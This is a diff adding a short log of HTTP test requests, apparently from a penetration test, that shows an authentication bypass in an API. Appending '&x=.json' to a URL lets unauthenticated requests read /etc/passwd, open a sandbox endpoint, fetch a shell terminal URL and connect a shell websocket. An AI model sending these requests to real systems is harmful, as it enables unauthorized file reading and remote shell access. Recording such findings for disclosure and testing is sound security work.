@@ -1,0 +1,8 @@
+t01_baseline | GET /v1/file/download?path=/etc/passwd | auth=none | 401 188
+t04_bypass_json | GET /v1/file/download?path=/etc/passwd&x=.json | auth=none | 200 1176
+t05_negative_txt | GET /v1/file/download?path=/etc/passwd&x=.txt | auth=none | 401 188
+t06_sandbox_no_key | GET /v1/sandbox | auth=none | 401 188
+t07_sandbox_bypass | GET /v1/sandbox?x=.json | auth=none | 200 2983
+t08_post_no_key | POST /v1/shell/exec | auth=none | 401 188
+t09_terminal_url | GET /v1/shell/terminal-url?x=.json | auth=none | 200 163
+t10_ws | GET /v1/shell/ws?session_id=<redacted>&x=.json | auth=none | 101
